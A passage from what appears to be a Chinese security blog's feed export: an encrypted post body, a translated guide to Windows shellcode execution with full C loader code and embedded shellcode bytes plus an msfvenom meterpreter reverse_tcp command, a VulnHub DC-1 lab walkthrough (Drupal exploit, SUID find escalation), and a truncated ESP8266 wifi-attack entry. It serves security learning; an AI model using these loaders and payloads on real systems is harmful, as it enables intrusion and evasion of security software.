liQQHNPWhJc8SO6ldyaI0QddWxo24GjCQqLhocuW0XI1IT+2ulhSrgPC8xYxcroP0g+EBL4Mele6BugkrSs533VSfkDTK0EXK3KXf/mYOCpCvzmii7+5wKTcOyM3uVSGt9YqfJMwsLgej3pFMdrKK3S5yfaojRB9tx+AJ9cJ406n8ppfL4axL05ZJY/x6VDV1463V9pOQTJqdCL5rY6xcmveSVxVrfzbVzqJXI7G9/HQQJgrzR0sg6nBWCMeSViwC2iADd4EGOnZl7DPKSINnysqA5wazichppkU0pGvwbxaTMRp1thof/Ae6/5IVOM8x58F6/4Xb8v5X2UoAdfzysrLY56Pjxiz5gyoe2EjuYZRHLa6jO56nCgCTv7KVTgoS0pQChsCR6eifAOcS+PQhVSes/X4raszPUFshsjG3WsNrhjY+nPBqJP3dU14Aq7E7kQqAtWdVOKOIdusjCD7pZga6dg8y+BiiVTz1jKcVaOoWB/KOFvj1qjAQLxagTUjC31m4XUDBtkIuGqpZBd07T9Nfgaq7k4qc8y5aDk9WpMe/TjBfkYqSjXJ+6c4wfejatxMKrR/UuQY2bpQ6tc2mnHDzj+37Bvp+pyt1epYuqE2hXm5R5gZZYv+bVMl216zW+T+QS2fuHPRor+fmsqhwcFAKQ/luLMnZdKXDlmmlD6ujlfIKxOCC14agchm+E5ZuE5YghRMizSqYT8rhX0zwHlya9BdV/W0ctFhEXUjL/RwHuiCxy9OQcplCaiD8BgeoGcuqFfwFn1VAKoNYucWLPXqKB4JfaPYF896s+uqgj4bNBYcEdMNwdrXQKk5vzaVrMRw8kdlBiP7TWK4qHlGV1ls6HeJsr0tzaDJXSwJFqnnhyFKPORpplZNgV45mxjTVpA9g0zIyyLEDfF4JmfohCM7uNuYbVogTOuyoC95MZwZRi7S9SHeao3fqjy6bxgAwvjeIkbNGB8xq2TzNeAnQRsEDhjDeLuUD5xe38clr8IlSyWJgsDlrShjXpK/Mj2JjqD4YD5BwpNSI7Rh8fBfwiQC+9rR2iiKThmLOj456E/mI5ZE8Um2l+ehh1tBS9o5Dyud6Dyw7+hRGbxMqa0FS5nl7EubjbNlzCcbE76fnqe+icsw5K4e3k52lOFG2rrRcFiK2P0BpXCKsTWIp68vFTQ7/owZYosPfNeaNJjic2C4X2Yzbu+HOqVWNfmH6QJV+X1xgp6isusWcbu4TMcMH/Ca0K5ZWhvMwokc9mFErFndYkudPU306I6iBiNW4jYRB3jzOh3xqM3uR+I63AFo2WTyPhbTbIOuh7y7iOwSm5BKGwyvXa4OuNa2lB3qpVamAKtLkD05+5w9h8jwXPlHhDfOCBDC5YzmitBsWm0JBF2OObputXVcy2cb8USimlyPVYI69PPo1dtjzLmZAZTin730vZVYBftQ3i64xNn21XBrlp/r47kH18GL8izwJ1phF9rNj7u8dNczscsLp2iH+zZgyL7QH2IGjDTwFd+KUdTMw+/DNucJncjN7JaIvk23Ql+8nBTER+QNs6HY6+VBM+rXXTB+oBs4HPyhW2c7x8QVUcYzNyjEMVGnWvwaJBz82KcKcd2xo3RW2TCiOq6mIXkqSibyHKc2cg/gBXjRbPamM7SPxFJQ66Y9G+usa5mIOMJ9cXvz3yyCRtV4cGPujbENnpBAQpDJEyHrsOGiASbaQUl7+GFyWba3EkBDWUzAeDtw9cMe5FOz2J8k84ki3Wic+EWTF+pMdpcGeMYYzeEth8L9bJ1iqE7Xl/3GgjYPssjV6vr+xj7/2RczHPpfwKaALpCvaG06rGaaM4757R8QrtEmfEQahsIu9tRBNknArt44pLTF2mqAsxB1TX+bniXvbx5+l/caRwMe7pK9L3mS669BlR4DRBT+EwfsZSFu3fvBefdEYblu+PV2+eQ09QDm6hfL3N4g+yPah+qkt5wzHn/Zg7HN3G+u1T/6b7hFy1NytLKU4tBDmfPwRRYovxMz/RfrWZNvTzofLpY9SCAQ8Nv8xw0viMNHeSDXqYnyFusDXdHLRbtiWR8KFevvnlL65v5MFWCBrEfbYXw3vCmpW5dD9ic2qF6bFCuPAcB6N5E8KpmS1lxzWe/bzunBqjh69DtzFkQXTmR3zax44X244Yrc2BWb4KWeKyGyJsNy9bkII8+NtDsJgAyFSMkqHg5OFxvj0dzCfzIigS5KvbvXdZ/mHcafRXS9Cu4Yqux/lHE/9t+g8Cljh3Kyfv3JOG8I/1HWIYoQdv7u8cKxEYYI6pqEbtEfmNlDeZxjX8zcOxGolDdC0bbIT5mR6hIZGEa6Xg1HPUfkM/7wASWHyQKQd/isLEmEpiZl7Vb8pT/W7TH4Y3ylufFThF7OZm5NyMIdvyqaE+7I3ct2AOL5D0iOBpblUrdiNFqV8jzHdg3CozBHxiXeo1RhkpQa5Q42SGvztXgvRmVLnOywS1G02g0/t5LT72NuaWDeE5FSmfMDXasmAx+LMHdA3J5BcagMKU885S9WTXS45YtUZkP2J01XBQgrgUZXxjOz/hpzHETXlm+5UBsclurErGj7CVFIrHDI6lpeYIGgfiT9GYbtdsU9ljpcpmkNedxG7emAaJIVembWQl4L96o4Ew1YGDT7xyKwr83ITJIxd5DBbAFJeulArHId7HsmEcJGY2Q6GCsU0HMYd01z+Gkmnb5XiCOD4rBQfbIui0RRPVsSSmDZESslcGf/IdnsfzdQJCTUsOW9NB4JHbHjZ3S2PpiVKHgc1rIxcoIeNzWWNnMdgAhXc/HaI1C3fseb83R+ry7+YPSnVI7Y1o6V+gl81aHJgUA24FUrkIO6ouTeZ+k4vFkKexJQNBtj1XY3bjkdoqmavS6RkvN8y6pwHve+iOQoxNvXsjt0EIEhxa34g8ttkEGoQL02x55sB+3lMAzB5fRM2sEO/Pz6m3zuSEZv0FdjWHvwm15+rSKlwHuJaSQI+hz7HbP3ZE9pXCI0rv8ToCmVayRpXMUt9S1e+w9ZrfToiIFypAQk5SahBTbNx1ri14r4f7epmJMD88klDeZIftjN0aXScYQ9CembaWSWyBHoI7ZxGYqld9pgn1xtGBUoQT9Xo445xcEaqA0AXKVFylF/82aAN2ywEbKqV4U4BRiDR+st7nSOgVltKO+9BqZkhMNJHXYsjJEllFgfhTbXbLkJb1V/jytMI7/SZm1Wzcwoa2Z6f9s53gPOsVjq3QVbihrTBO63XdPFWpvE51mDGDHpGD35QLYeU2PFK6sC71lZXPVOn1EGQqI5baT8hzMzYj9v6uryncOUGlAtmxjgbOnVXgbmTWdKB6YqJbleixks18fF1tdhzpXugM1yBByAdxMDjxZv/HbMZtLWQHes4+2I41wUK8CQ9Sgqj+kiSo01cwJUvGprilSpPVQHNpxnndlIe3nJIkdLdf1Qi/SIeenG9nIf26ZHu/ZUSIBG5ha9RdBmrnlcODxFLrchW4ew8octtLRYz9vflf2BToMtcDN9XjUBZCr0tkhCUAnIU2tkv3v+SeZDOkrrTDNDS//Uajo1Q1tfwJpA/ymA1hpDe2MXd1EElFEunvM0qAaht4EEo2OjJQbSCvIZW8jgwAJP8YzsuqOX+nQVDlXCdkWZCSFwAexHSJgZRwyCTPdW4z/DvMXBRB7MJWgyg6Tn6eNN6oBFd4WJApr8av+z0HRuDAWimAXspxKToZX7FxfRS/5wHocHf6lAiJyhkvkbyPI7M579kLxFa3D5VC+XBcp20IBfnLt2cupyFh6oaPQ4EGsmOdbvu5pAy77JRQX5e86DmGXtdc6damDeOg/JKEYEF3S6S/g0kwB8FAs3m1BsfEkZG8GLWl12ZVG54nHFthcEJbIuCLuyP6YLN2scKDWVsoKiC17ebG0PX7Zn3OUiGtg3IxqJzstK6lJXPpTdAdLtJ8i0eYaKQ+BCQtO8Dy2sKRGCAPdGf6dVZdWAQKKNzCbNxM01BOafv4cSs0FvNW6HCyAKE/aTm7C+QXzOHnZfX9N1B4cJHAhjzvSOo8rCojBsmkLY6DVmVRS+nF/nQguaux383WfFKXEVx3KEs9Rp27YdZjrmhWSINUNiIwI/AKvF+bG5Uf8zwi+1rBoX3TPuPWaeOJE+ERFhEccYAAI8hrP2F9tXxVupKYUDFWFfsm9dYNfIcqxhRW3jSMmdigQdTd54r8OfFL1xKAMpjoKvinHubUwx6C6N07IlsdNikcmb9hddqVSp4BxM4j6TQiw+Ho/D8yvKYxHmA9+XfjJWQ3rYykvgW7l4hR/COPGl/DxgejzeQrdXwCauX8PLa39wIaiRGKJrQwZukcnYAd7A4UOdROEDFPDg1HUp/kMcgQw9Zim59tqyF2n743dEqII2ffP0C5tNql9jJJemhO2YjDV2wcEis+EJj4YTVIVF/D5jNkodLyaFllUZTv8UEKb125Eo0gt6b87JwnaaJ8Tjm4xjdf0U73qCAUgdUhohLbCuzYRxYzkIRS6z5wSDs1QIdcFGBJhLn2HmxMUaUgq6cYM2yh+pvhtXeXgN6g7KQ7C5E44L8JobSmgnAAVp4EC9fThabOHWzyKw/y/E6ywWvQ88sbouZoM0U+DPEhWtJSjAhZec3lYluY/keVZYP474vyL2hYFEUYZg9SRC4UaahTvWMMJxc6vgHOehu2/ATon03WhJlLXdhXyh56c1oUfUdd9dV8FlIGY/4qvDobShPKC37EFjCd8LKIXwOiuq4o+YTOTdxVUS9JJ8Ei0heP7LOcTpcciL3p69mdwYGL2BZiT/28s0wa+XdjcCM2HBbQ/Hwr4Y7OiSoJMc93/9JVipRwsowavxwwEpp79Z2MxLexBJV/51PUn5enbdRZ0hGoPn9MhjzBZ+YYLyAyl7q/0YCPKaqTSyZChrtLLxRqdJzSO7Wc0fiGDEy6KIO4PvgTJqiQdvXsCkrlYOSzwTQLW5OgMIWEDsO6p885NUW+ZkHB9ZyTettnDX9KjdpvTyPOmSN29go/B6LwD5TS3RwBbT3s2yySkbciHM58HI1VzI28JT22hS9iqUYuKG/nsLb121My8/EwCpoOsqyY9GfcAVEJpM7d+NdL8xwaAiO2KphQ9edsLJFU+UeH0Yc4U3UAd2ZI69wLbFqiuxj2BVjnEQLH2Cv1ycl1lwUhCo+OsojAK7MVM3KEXplYyzuMV0ViLR8wdMK4sN09KRcoxnYd+h/g1yKtdHQkwY6SVZKM=</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>执行shellcode的方法</title>
      <link href="/posts/44310b89.html"/>
      <url>/posts/44310b89.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天看了篇介绍shellcode的文章，故此做个笔记。也可以理解为翻译文<br>原文链接：<a href="https://www.contextis.com/en/blog/a-beginners-guide-to-windows-shellcode-execution-techniques" target="_blank" rel="noopener">A Beginner’s Guide to Windows Shellcode Execution Techniques | Context Information Security</a></p><h2 id="进程内存布局"><a href="#进程内存布局" class="headerlink" title="进程内存布局"></a>进程内存布局</h2><p>需要理解的第一个概念是，整个虚拟内存空间分为两个相关部分:为用户进程保留的虚拟内存空间(用户空间)和为系统进程保留的虚拟内存空间(内核空间)，如下所示<br><img src="https://s1.ax1x.com/2020/04/16/JEVtUI.png" alt=""></p><p>当处理器读写内存位置时，它使用一个虚拟地址。作为读写操作的一部分，处理器将虚拟地址转换为物理地址。通过虚拟地址访问内存具有这些优点:</p><ul><li>程序可以使用一个连续的虚拟地址范围来访问物理内存中不相邻的大内存缓冲区</li><li>程序可以使用一定范围的虚拟地址来访问大于可用物理内存的内存缓冲区。随着物理内存供应的减少，内存管理器将物理内存页(通常为4 kb)保存到磁盘文件中。数据或代码页根据需要在物理内存和磁盘之间移动。</li><li>不同进程使用的虚拟地址相互隔离。 一个进程中的代码无法更改另一进程或操作系统正在使用的物理内存。</li></ul><p>进程可用的虚拟地址范围称为该进程的虚拟地址空间。 每个用户模式进程都有其自己的专用虚拟地址空间。 对于32位进程，虚拟地址空间通常为2 GB范围0x00000000至0x7FFFFFFF。 对于64位Windows上的64位进程，虚拟地址空间为128 TB范围0x000’00000000到0x7FFF’FFFFFFFF。 虚拟地址范围有时称为虚拟内存范围。</p><p><img src="https://s1.ax1x.com/2020/04/16/JEVsbj.png" alt=""></p><p>该图显示了两个64位进程的虚拟地址空间：Notepad.exe和MyApp.exe。 每个进程都有自己的虚拟地址空间，该地址空间从0x000’0000000到0x7FF’FFFFFFFF。 每个阴影块代表一页（4 KB）的虚拟或物理内存。 请注意，记事本进程使用三个连续的虚拟地址页面，从0x7F7’93950000开始。 但是虚拟地址的这三个连续页面被映射到物理内存中的非连续页面。 还要注意，两个进程都使用从0x7F7’93950000开始的虚拟内存页面，但是这些虚拟页面被映射到物理内存的不同页面。</p><h4 id="用户空间和系统空间"><a href="#用户空间和系统空间" class="headerlink" title="用户空间和系统空间"></a>用户空间和系统空间</h4><p>诸如Notepad.exe和MyApp.exe之类的进程在用户模式下运行。 核心操作系统组件和许多驱动程序以特权更高的内核模式运行。 有关处理器模式的更多信息，请参阅用户模式和内核模式。 每个用户模式进程都有其自己的专用虚拟地址空间，但是以内核模式运行的所有代码共享一个称为系统空间的虚拟地址空间。 用户模式进程的虚拟地址空间称为用户空间。在32位Windows中，总的可用虚拟地址空间为2 ^ 32字节（4 GB）。 通常，较低的2 GB用于用户空间，较高的2 GB用于系统空间。</p><p><img src="https://s1.ax1x.com/2020/04/16/JEVHaR.png" alt=""></p><p>在32位Windows中，您可以选择（在启动时）指定超过2 GB的用户空间可用。 结果是更少的虚拟地址可用于系统空间。 您可以将用户空间的大小增加到3 GB，在这种情况下，系统空间只能使用1 GB。 要增加用户空间的大小<br>在64位Windows中，虚拟地址空间的理论量为2 ^ 64字节（16艾字节），但实际上仅使用了16艾字节范围的一小部分。 从0x000’00000000到0x7FF’FFFFFFFF的8 TB范围用于用户空间，从0xFFFF0800’00000000到0xFFFFFFFF’FFFFFFFF的248 TB范围的部分用于系统空间。</p><p>在用户模式下运行的代码可以访问用户空间，但不能访问系统空间。 此限制可防止用户模式代码读取或更改受保护的操作系统数据结构。 以内核模式运行的代码可以访问用户空间和系统空间。 也就是说，以内核模式运行的代码可以访问系统空间和当前用户模式进程的虚拟地址空间。<br>在内核模式下运行的驱动程序在直接读取或写入用户空间中的地址时必须非常小心。 这种情况说明了原因。</p><pre><code>1. 用户模式程序启动一个从设备读取一些数据的请求。 该程序提供缓冲区的起始地址以接收数据。2. 在内核模式下运行的设备驱动程序例程开始读取操作，并将控制权返回给其调用者。3. 稍后，设备中断当前正在运行的任何线程，以表示读取操作已完成。 中断由在此任意线程上运行的内核模式驱动程序例程处理，该线程属于任意进程。4. 此时，驱动程序不得将数据写入用户模式程序在步骤1中提供的起始地址。该地址位于发起请求的进程的虚拟地址空间中，这很可能与请求的地址不同。 当前的过程。</code></pre><h4 id="分页池和非分页池"><a href="#分页池和非分页池" class="headerlink" title="分页池和非分页池"></a>分页池和非分页池</h4><p>在用户空间中，可以根据需要将所有物理内存页面调出到磁盘文件中。 在系统空间中，可以将某些物理页面调出页面，而另一些则不能。 系统空间具有两个用于动态分配内存的区域：分页池和非分页池。<br>可以根据需要将分页池中分配的内存分页到磁盘文件中。 在未分页的池中分配的内存永远不能分页到磁盘文件中。<br><img src="https://s1.ax1x.com/2020/04/16/JEZFit.png" alt=""></p><p>这样做的第一个收获是，每个进程都有自己的专用虚拟地址空间，其中“内核空间”是一种“共享环境”，这意味着每个内核进程都可以在其想要的任何地方读取/写入虚拟内存。 请注意，后者仅适用于没有基于虚拟化的安全性（VBS）的环境，但这是不同的主题。</p><p>上面的表示显示了全局虚拟地址空间的样子，让我们将其分解为单个进程<br><img src="https://s1.ax1x.com/2020/04/16/JEZZQS.png" alt=""></p><p>单个进程虚拟内存空间由多个部分组成，这些部分通过地址空间布局随机化（ASLR）放置在可用空间边界内的某个位置。 这些部分中的大多数应该是熟悉的，但是为了使所有人都在同一页面上，以下是这些部分的简要介绍</p><p><strong>.TEXT(入口地址):</strong>  这是可执行进程映像所在的位置。在这个区域中，您将找到可执行文件的主入口，即执行流开始的地方<br><strong>. DATA(映像基址):</strong>.DATA节包含全局初始化或静态变量。 未绑定到特定功能的任何变量都存储在此处。<br><strong>.BSS(映像大小):</strong> 与. data段类似，此部分包含任何未初始化的全局变量或静态变量。<br><strong>HEAP:</strong> 这是所有动态局部变量的存储位置。 每次创建在运行时确定所需空间的对象时，所需的地址空间都会在HEAP中动态分配（通常使用alloc（）或类似的系统调用）。</p><p><strong>STACK:</strong> 堆栈是分配给每个静态局部变量的位置。如果在函数中局部初始化一个变量，则该变量将被放置在堆栈上。</p><p><img src="https://s1.ax1x.com/2020/04/16/JEZUeJ.png" alt=""></p><h2 id="动态分配内存"><a href="#动态分配内存" class="headerlink" title="动态分配内存"></a>动态分配内存</h2><p>运行shellcode的步骤：</p><ol><li>您需要标记为可执行的虚拟地址空间（否则DEP会引发异常）</li><li>您需要将您的shellcode放入该地址空间</li><li>您需要将代码流定向到该内存区域</li></ol><p>完成这三个步骤的教科书方法是使用WinAPI调用来动态分配可读，可写和可执行（RWX）内存，并启动指向新分配的内存区域的线程。 用C编写代码看起来像这样：</p><pre><code class="cpp">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;iostream&gt;using namespace std;int main(){       unsigned char shellcode[] =              &quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;              &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;              &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;              &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;              &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;              &quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;              &quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;              &quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;              &quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;              &quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;              &quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;              &quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;              &quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;              &quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;              &quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;              &quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;              &quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;              &quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;              &quot;\x63\x2e\x65\x78\x65\x00&quot;;       //申请内存空间       LPVOID addressPointer = VirtualAlloc(NULL,sizeof(shellcode),0x3000,0x40);       //将您的shellcode放入该地址空间       RtlMoveMemory(addressPointer, shellcode, sizeof(shellcode));    //创建线程       CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);       Sleep(1000);       system(&quot;pause&quot;);       return 0;}</code></pre><p><img src="https://s1.ax1x.com/2020/04/17/JEZcOe.png" alt=""><br>使用windebug调试：</p><pre><code>windbg：File-&gt;Open executtable打开exelm #查看加载的模块g #运行</code></pre><p><img src="https://s1.ax1x.com/2020/04/17/JEZ5fP.png" alt=""></p><p>文章原图<br><img src="https://s1.ax1x.com/2020/04/17/JEZTl8.md.png" alt=""></p><p>注意：成熟的杀软/EDR系统很容易检测到WinAPI调用的使用</p><h2 id="函数指针的执行"><a href="#函数指针的执行" class="headerlink" title="函数指针的执行"></a>函数指针的执行</h2><p>（在windows上并不行。。。）<br>在内存中执行shellcode的另一种技术是使用函数指针</p><pre><code class="cpp">#include &quot;stdafx.h&quot;#include &lt;iostream&gt;using namespace std;int main(){       unsigned char shellcode[] =              &quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;              &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;              &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;              &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;              &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;              &quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;              &quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;              &quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;              &quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;              &quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;              &quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;              &quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;              &quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;              &quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;              &quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;              &quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;              &quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;              &quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;              &quot;\x63\x2e\x65\x78\x65\x00&quot;;       int(*func)();       func = (int(*)()) (void*)shellcode; //创建了一个匿名指针函数（lamba）       (int)(*func)(); //运行匿名函数       // Shortcut way to do it       // (*(int(*)()) buf)();       // sleep for a second       Sleep(1000);       return 0;}</code></pre><p>运行过程：</p><ol><li>在上述代码段中声明了一个指向函数的指针，该函数指针名为“ func”</li><li>然后，为已声明的函数指针分配要执行的代码的地址（由于将为变量分配一个值，因此为func指针分配一个地址）</li><li>最后，调用函数指针，这意味着将执行流定向到分配的地址</li></ol><p>windbg调试<br><img src="https://s1.ax1x.com/2020/04/17/JEeB7j.png" alt=""></p><h2 id="TEXT段执行"><a href="#TEXT段执行" class="headerlink" title=".TEXT段执行"></a>.TEXT段执行</h2><p>仓库地址：<a href="https://github.com/Mr-Un1k0d3r/Shellcoding" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/Shellcoding</a><br>C执行asm（只能32位）</p><pre><code class="cpp">#include &lt;Windows.h&gt;int main() {    asm(&quot;call code\n\t&quot;        &quot;.byte &lt;shellcode&gt;\n\t&quot;        &quot;code:\n\t&quot;        &quot;ret\n\t&quot;);    return 0;}</code></pre><p>msf生成32位的shellcode</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.110 LPORT=4444 -f raw -o test.bin</code></pre><p>转换成shellcode</p><pre><code>python makefile.py test.bin cnmb.c</code></pre><p>编译</p><pre><code>gcc  -c cnmb.c -o cnmb.ogcc -o cnmb.exe cnmb.o</code></pre><p><img src="https://s1.ax1x.com/2020/04/17/JEec90.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/04/17/JEefuF.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/04/17/JEejDe.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>vulnhub DC-1</title>
      <link href="/posts/4e50c1f3.html"/>
      <url>/posts/4e50c1f3.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>翻百度云的时候翻到之前保存的vulnhub的几个靶场，下载来做做</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>先找到靶场的IP</p><pre><code>fping -ag 192.168.1.0/24 &gt; jj.txt</code></pre><p>最后确认是192.168.1.106，先nmap扫描</p><pre><code>nmap -min-rate 10000 -T5 -A 192.168.1.106</code></pre><p><img src="https://s1.ax1x.com/2020/04/14/JpgrIx.md.png" alt=""></p><p>web是Drupal这套CMS<br><img src="https://s1.ax1x.com/2020/04/14/Jpg7Jf.png" alt=""></p><p>whatweb查看了一下</p><pre><code>whatweb https://192.168.1.106</code></pre><p><img src="https://s1.ax1x.com/2020/04/14/JpgHW8.png" alt=""></p><p>目前得到的信息</p><pre><code>ip：192.168.1.106os:debainopen Port:22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)80/tcp  open  http    Apache httpd 2.2.22 ((Debian))|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache/2.2.22 (Debian)|_http-title: Welcome to Drupal Site | Drupal Site111/tcp open  rpcbind 2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100024  1          40475/tcp   status|   100024  1          45311/tcp6  status|   100024  1          55552/udp6  status|_  100024  1          55843/udp   statusweb information:apache:2.2.22cms version:Drupal 7php version:php/5.4.45-0+deb7u14path:http://192.168.1.106/userhttp://192.168.1.106/admin</code></pre><p>看了一下路径也没啥好整的<br><img src="https://s1.ax1x.com/2020/04/14/Jp2AOJ.md.png" alt=""></p><p>搜索了一下Drupal 7的exp，发现有个SQL注入。通过msf发现有利用exp<br>参考链接：<a href="https://blog.csdn.net/iteye_14261/article/details/82514405" target="_blank" rel="noopener">Drupal 数据库配置连接_数据库_I Am Nothing-CSDN博客</a></p><p><img src="https://s1.ax1x.com/2020/04/14/Jp2J0A.md.png" alt=""></p><p>查看了一下网络连接，发现mysql只有本地能访问<br><img src="https://s1.ax1x.com/2020/04/14/Jp201S.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/04/14/Jp2smj.png" alt=""></p><p>搜索了一下Drupal的数据库配置文件在哪里<br>参考链接：<a href="https://blog.csdn.net/iteye_14261/article/details/82514405" target="_blank" rel="noopener">Drupal 数据库配置连接_数据库_I Am Nothing-CSDN博客</a></p><p><img src="https://s1.ax1x.com/2020/04/14/JpRPAI.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/04/14/JpRF4P.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/04/14/JpRZjg.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/04/14/JpRnBj.png" alt=""></p><p>尝试使用john破解此hash，发现无果。尝试直接提权，sudo -l无结果，find / -perm /4000 2&gt;/dev/null<br><img src="https://s1.ax1x.com/2020/04/14/JpR83T.png" alt=""></p><p>在这里找到提权的方法：<a href="https://gtfobins.github.io/gtfobins/find/" target="_blank" rel="noopener">find | GTFOBins</a><br><img src="https://s1.ax1x.com/2020/04/14/JpRtu4.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ESP8266搞wifi初探</title>
      <link href="/posts/d1398a09.html"/>
      <url>/posts/d1398a09.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ESP8266和badusb一起买的，之前弄了badusb。ESP8266还没搞，今天搞了一下。还挺好玩，故此记录一下<br><img src="https://s1.ax1x.com/2020/04/11/GHB1vd.png" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>需要工具：</p><pre><code>1.ESP82662.数据线（线插ESP8266之后插入电脑没有COM接口的原因下面会说）</code></pre><p>当数据线插入ESP8266和电脑后，设备管理器没有出现新的COM接口有两个原因：<br>1.你用的这条线是充电线而不是数据线（刚刚踩完的坑）<br>2.没有安装驱动，驱动下载（根据自己的系统下载对应的驱动）（<a href="http://www.wch.cn/download/CH341SER_MAC_ZIP.html" target="_blank" rel="noopener">CH341SER_MAC.ZIP - 南京沁恒微电子股份有限公司</a>）</p><p>成功连接会出现一个COM接口<br><img src="https://s1.ax1x.com/2020/04/11/GHD3JU.png" alt=""></p><p>工具的那些来自于90sec帖子：<a href="https://forum.90sec.com/t/topic/917/7" target="_blank" rel="noopener">利用硬件，拿走你家wifi，没商量 - 技术文章 - 90Sec</a></p><blockquote><p>下载资源连接链接链接：<a href="https://pan.baidu.com/s/1eT-aenwt6BfG3yEMkp3mKw" target="_blank" rel="noopener">https://pan.baidu.com/s/1eT-aenwt6BfG3yEMkp3mKw</a> 6<br>提取码：w6uk</p></blockquote><p>打开收录工具点击ESP8266 